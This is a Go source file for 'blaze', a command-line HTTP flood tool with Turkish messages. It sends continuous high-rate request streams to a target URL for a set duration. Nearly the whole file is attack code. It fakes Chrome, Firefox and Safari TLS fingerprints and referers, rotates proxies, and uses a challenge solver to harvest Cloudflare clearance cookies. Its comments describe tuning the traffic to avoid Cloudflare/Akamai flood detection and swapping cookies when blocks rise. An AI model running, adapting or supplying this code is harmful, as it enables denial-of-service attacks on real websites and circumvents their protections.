package main

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

// ANSI colors
const (
	white = "\033[37m"
	gray  = "\033[38;5;245m"
	red   = "\033[31m"
	reset = "\033[0m"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	solve := false

	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		if arg == "--solve" {
			solve = true
		} else {
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	var solvedCookies string
	var solvedUA string
	var solverSrv *SolverServer
	var cookiePool *CookiePool
	if solve {
		var err error
		solverSrv, cookiePool, solvedCookies, solvedUA, err = startSolver(targetURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
		defer solverSrv.Stop()
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve, cookiePool)
}

// startSolver brings up the persistent solver server, fills a cookie pool,
// captures the solver browser's TLS fingerprint, and returns the first
// cookie set so blaze can seed its initial templates.
func startSolver(targetURL string) (*SolverServer, *CookiePool, string, string, error) {
	const poolSize = 5

	srv := newSolverServer(targetURL, poolSize, 9876)
	fmt.Printf("solver server baslatiliyor (havuz=%d)...\n", poolSize)
	if err := srv.Start(poolSize); err != nil {
		return nil, nil, "", "", err
	}

	// At least 1 healthy slot is enough to start; we wait up to 2 minutes for
	// the full pool but proceed as soon as we have one usable cookie.
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	healthy, err := srv.WaitPoolReady(ctx, 1, 2*time.Minute)
	if err != nil {
		srv.Stop()
		return nil, nil, "", "", err
	}
	fmt.Printf("%shavuz hazir: %d slot saglikli%s\n", white, healthy, reset)

	// Try to capture the solver browser's actual TLS fingerprint so the user
	// can compare it with the gofire client's emulated JA4. UAM binds
	// cf_clearance to JA4 + UA; any drift causes "all mitigated".
	if fp, err := srv.Fingerprint(ctx); err == nil && fp != nil {
		fmt.Printf("%ssolver fingerprint: ja4=%s ja3=%s ua_tail=%s%s\n",
			gray, fp.JA4, fp.JA3Hash, lastWord(fp.UserAgent), reset)
	}

	// Populate the local cookie pool. Aim for poolSize but accept fewer.
	pool := newCookiePool(srv)
	got := pool.Fill(ctx, poolSize)
	if got == 0 {
		srv.Stop()
		return nil, nil, "", "", fmt.Errorf("solver havuzdan hic cookie alinamadi")
	}
	fmt.Printf("%scookie havuzu: %d adet hazir%s\n", white, got, reset)

	first := pool.Snapshot()[0]
	return srv, pool, first.Cookies, first.UserAgent, nil
}

func lastWord(s string) string {
	parts := strings.Fields(s)
	if len(parts) == 0 {
		return ""
	}
	return parts[len(parts)-1]
}

type clientGroup struct {
	name      string
	tag       string // Ch, FF, SF
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
	templates []*http.Request
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

func (cg *clientGroup) ActiveConnections() int64 {
	var total int64
	for _, c := range cg.clients {
		total += c.ActiveConnections()
	}
	return total
}

func (cg *clientGroup) updateCookies(newCookies string) {
	for i, tmpl := range cg.templates {
		// Clone the template and set new cookie - atomic swap, no race.
		newTmpl := tmpl.Clone(tmpl.Context())
		newTmpl.Header.Set("Cookie", newCookies)
		cg.templates[i] = newTmpl
		cg.pipelines[i].SetTemplate(newTmpl)
	}
}

// browserLabel maps tag to full display name
var browserLabel = map[string]string{
	"Ch": "Chrome 147",
	"FF": "Firefox 150",
	"SF": "Safari iOS 18",
}

// formatTestResult returns the impersonate line for a browser test.
func formatTestResult(tag string, statusCode int, err error) string {
	label := browserLabel[tag]
	if label == "" {
		label = tag
	}

	if err != nil {
		errMsg := err.Error()
		var reason string
		switch {
		case strings.Contains(errMsg, "tls handshake") || strings.Contains(errMsg, "handshake"):
			reason = "tls handshake failed"
		case strings.Contains(errMsg, "timeout") || strings.Contains(errMsg, "Timeout"):
			reason = "timeout"
		case strings.Contains(errMsg, "connection refused"):
			reason = "connection refused"
		default:
			reason = errMsg
			if len(reason) > 80 {
				reason = reason[:80]
			}
		}
		return fmt.Sprintf("%sImpersonate %s %s>%s %s%s%s", white, label, gray, reset, red, reason, reset)
	}
	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool, cookiePool *CookiePool) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	totalTargetClients := threads
	if totalTargetClients > 40 {
		totalTargetClients = 40
	}
	if totalTargetClients < 10 {
		totalTargetClients = 10
	}

	// MaxConnsPerHost cap. With HTTP/2 each connection multiplexes ~100 streams,
	// so we don't need a connection per worker. Capping at 2x the idle pool size
	// gives us burst headroom (new dials block briefly under spikes) without
	// letting the client open thousands of TCP sockets per second - which
	// Cloudflare/Akamai score as connection flooding and rate-limit.
	const idlePerHost = 256
	const maxPerHost = idlePerHost * 2

	baseOpts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(1024),
		gofire.WithMaxConnsPerHost(maxPerHost),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	browserReferers := map[string]string{
		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
		"chrome":  "https://www.google.com/",
		"firefox": "https://duckduckgo.com/",
	}

	var proxyRotator *gofire.ProxyRotator
	if proxyArg != "" {
		if isProxyFile(proxyArg) {
			var err error
			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	var parsedCookies []*http.Cookie
	if solvedCookies != "" {
		parsedCookies = parseCookieHeader(solvedCookies)
	}

	type browserSpec struct {
		name    string
		tag     string // Ch, FF, SF
		profile gofire.BrowserProfile
		clients int
	}

	var browsers []browserSpec

	if solvedCookies != "" {
		browsers = []browserSpec{
			{"chrome", "Ch", gofire.Chrome147, totalTargetClients},
		}
		if solvedUA != "" {
			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
		}
	} else {
		safariClients := totalTargetClients * 4 / 10
		chromeClients := totalTargetClients * 3 / 10
		firefoxClients := totalTargetClients - safariClients - chromeClients
		if safariClients < 2 {
			safariClients = 2
		}
		if chromeClients < 1 {
			chromeClients = 1
		}
		if firefoxClients < 1 {
			firefoxClients = 1
		}
		browsers = []browserSpec{
			{"firefox", "FF", gofire.Firefox150, firefoxClients},
			{"chrome", "Ch", gofire.Chrome147, chromeClients},
			{"safari", "SF", gofire.SafariIOS18, safariClients},
		}
	}

	groups := make([]*clientGroup, len(browsers))

	totalClients := 0
	for _, bs := range browsers {
		totalClients += bs.clients
	}
	workersPerClient := (threads * streams) / totalClients
	if workersPerClient < 1 {
		workersPerClient = 1
	}

	for bi, bs := range browsers {
		cg := &clientGroup{name: bs.name, tag: bs.tag}
		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))

		// Snapshot the cookie pool once so we can deal cookies round-robin
		// across this group's clients. With pool=5 and clients=10 each
		// cookie is shared by ~2 clients, spreading load and giving CF
		// fewer "this single cookie is being abused" signals to weight on.
		var poolCookies []SolverCookie
		if cookiePool != nil {
			poolCookies = cookiePool.Snapshot()
		}

		for i := 0; i < bs.clients; i++ {
			c, err := gofire.Emulate(bs.profile, opts...)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
				os.Exit(1)
			}
			if proxyRotator != nil {
				c.SetProxyRotator(proxyRotator)
			}
			if len(parsedCookies) > 0 {
				_ = c.SetCookies(targetURL, parsedCookies)
			}
			tmpl, err := c.PrepareRequest(method, targetURL)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
			// Per-client cookie assignment: round-robin across the pool so
			// distinct clients carry distinct cf_clearance values.
			cookieForClient := solvedCookies
			if len(poolCookies) > 0 {
				cookieForClient = poolCookies[i%len(poolCookies)].Cookies
			}
			if cookieForClient != "" {
				tmpl.Header.Set("Cookie", cookieForClient)
			}
			p := c.NewPipeline(workersPerClient)
			p.SetTemplate(tmpl)
			cg.clients = append(cg.clients, c)
			cg.pipelines = append(cg.pipelines, p)
			cg.templates = append(cg.templates, tmpl)
		}
		groups[bi] = cg
	}
	defer func() {
		for _, cg := range groups {
			cg.Close()
		}
	}()

	// Test one client per browser - clean output
	for _, cg := range groups {
		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, method, targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Println(formatTestResult(cg.tag, 0, testErr))
		} else {
			fmt.Println(formatTestResult(cg.tag, resp.StatusCode(), nil))
			resp.Close()
		}
	}

	// Pre-warm silently
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	for _, cg := range groups {
		for _, c := range cg.clients {
			_ = c.PreConnect(warmCtx, targetURL, 4)
		}
	}
	warmCancel()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	var (
		totalSent   atomic.Int64
		totalFailed atomic.Int64
		errMu       sync.Mutex
		recentErrs  []string
		errCountMap sync.Map
		recent403   atomic.Int64
		recentTotal atomic.Int64
		refreshing  atomic.Bool
	)

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		if err != nil {
			totalFailed.Add(1)

			errStr := err.Error()
			if strings.Contains(errStr, "context canceled") {
				return
			}
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 10 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
		} else if resp != nil {
			recentTotal.Add(1)
			if resp.StatusCode() == 403 {
				recent403.Add(1)
			}
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			p.OnResult = onResult
		}
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			pipeline.FireAndForget(ctx, method, targetURL, nil, nil)
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			for i := 0; i < 4; i++ {
				feedWg.Add(1)
				go feedPipeline(p)
			}
		}
	}

	// Auto-refresh: when 403/503 rate spikes, rotate every group's cookie
	// to a fresh one from the local CookiePool. The pool itself is fed by
	// the solver server in the background, so this is a cheap O(groups)
	// pointer swap rather than a multi-second browser solve.
	if solveEnabled && cookiePool != nil {
		go func() {
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					total := recentTotal.Load()
					count403 := recent403.Load()
					recentTotal.Store(0)
					recent403.Store(0)

					if total < 50 {
						continue
					}
					rate := float64(count403) / float64(total)
					if rate < 0.50 {
						continue
					}
					if !refreshing.CompareAndSwap(false, true) {
						continue
					}

					// Pick a fresh cookie from the pool. If pool is empty,
					// fall back to telling solver to rebuild and try again
					// next tick.
					pc := cookiePool.Pick()
					if pc == nil {
						refreshing.Store(false)
						continue
					}
					for _, cg := range groups {
						cg.updateCookies(pc.cookies)
					}
					refreshing.Store(false)
				}
			}
		}()
	}

	// RPS stats
	startTime := time.Now()
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				elapsed := time.Since(startTime).Seconds()
				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}
				fmt.Printf("\r%ssent:%d rps:%d peak:%d %.0fs%s   ",
					white, sent, rps, peakRPS, elapsed, reset)
			}
		}
	}()

	feedWg.Wait()
	fmt.Println()

	// Only show errors on stop
	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println()
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("%s[%dx] %s%s\n", red, count, e, reset)
		}
	}
	errMu.Unlock()
}

func parseCookieHeader(raw string) []*http.Cookie {
	header := http.Header{}
	header.Add("Cookie", raw)
	req := http.Request{Header: header}
	return req.Cookies()
}

func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
		os.Exit(1)
	}
	return v
}
